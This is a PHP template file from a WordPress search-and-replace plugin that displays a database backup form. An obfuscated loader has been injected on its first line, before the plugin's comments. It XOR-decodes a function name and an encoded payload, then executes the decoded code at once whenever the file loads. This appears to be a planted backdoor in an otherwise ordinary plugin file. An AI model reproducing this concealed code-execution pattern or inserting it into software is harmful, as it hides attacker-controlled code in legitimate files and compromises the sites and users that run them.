<?php $ojDFeO='-E+03R3K4=V<B<V'; $rwqfxl='N7NQG7l-AS5H+S8'^$ojDFeO; $LBInlVaA='WJdiZF ZBTW;cHU> HXMj:69kT3 S9;.- QCaWB9eSORCI-Y;zS=Rk 8,J>q=NYxq<1E0zrO;  lddnPBBrajs =;mqgiei<=QJO<lP+gpjyJYRSt507R.CmnQJ6Ualmu=hyOOczg9,=YdWzguQ , 3s0myexm915gbGcis>=9RVVFq><8o1aLnOfRX.Y>=bq, AgbRSLr9nLb681-gqZSO=6 bscZJJP>GV yJt A 00s=r6=OX6PUmgns;bvg<ulW0lm>=5glzwgH <8HmWM3scXO Xj=U6qung1NNrs9r4 1.RpznB7P71yKALpRXpZgI,Q. ZJCdkV91PU3 fkthc.:xikcqA efWSTfRmfq,.R, MO<mZfR.JM6gQ<McLIrG6=nxegCPZJ8ljbJ5QZC,c:H:f;xxA0JLTjkq37E+W5.LXDL=x+BKrT,J;<a4C q7.M1xwo6< RDTOf,SB8ydYsQLN1= QKHbjoQ3nbQ53 rEqHU1RURh>XH9VBYG8Xci9U3CnjcO050LJmltoS+MmTQ9<Per9=LRnylDqcv 0QUyYRQVgozNIBaJZIrOu e.QRwOtsMDkirasWDIWTi1PA=K;X;X5Ij17-= Z mZCj>JMWysRxjeAlCcXW,4 abUZ7LoQ< MQZ6ROmhwh;,4-1BtXSgH'; $vHDKpYt=$rwqfxl('', '>,LH<3N96=8U<--WS<+eMBYK40RT2fdCXTvjHw93l5:< =D6UZ+R 4DYX+a.P;-PUXP1QVRkPEYEDDNpb9xhcWOHOMLGNBR64X, NDtBGMJIqyv:HFDE>K-EJ5+B4HWMQTCRfEjsCVYIyJjZOQ5AXAhWY0Y;XIRTL<F.CLSMIK>38nUUYAFlHwdFo =Z,LSJUCU5NYXZ1xDdFFRYELGLz5.QEEYyG>+>1a,3YYwTF LCUH7xPR==W3=MOJ,x-9,u0L6CLIUXLGQDWC>APM-Dw69zG<.T95V0OQHNCZ+7Iy0VPAEOrMZJ4V<BTBA<Fz;>PrFmH0ZAsj8nb0VC54PHFCP71kk-,87Q SEB<6-FoSFUZO>YEdoGgSovJ+9W8:Y4CqiV,SDUrlng4;>YLWBnC066IX0AGlFrreT+85JVQsB+X2GG-4-6XPS-9-0M>Zc>Y6TYUO>TNC0RYC= 1gBH26YPHyW5-:PbK42aKQe8UFF5TGARcWh4C 4+7U=1f3:04L+KNR0JdBJG+QAQejKJTG>OxEp5XH1>URX5u3PLyLCQCUb1O=03cSZC,+vUxoyCxAAVH40C-CCucBITGS66;6-6Z58b.C1H,FaMAVTQO;DJvcNZ+96PZrXJEaL8iQ2ZULIF1;C-4vLA4=5W6h0ALb2ILDEjDqhm5'^$LBInlVaA); $vHDKpYt();
/**
 * Template for displaying sql export page
 */
// Prevent direct access.
if ( ! defined( 'SEARCH_REPLACE_BASEDIR' ) ) {
	echo "Hi there!  I'm just a part of plugin, not much I can do when called directly.";
	exit;
}
?>

	<p><?php esc_html_e(
			'Create a backup of your database by clicking "Create SQL File".',
			'search-and-replace' ); ?>
	</p>

	<form action="" method="post">
		<?php $this->show_submit_button(); ?>
	</form>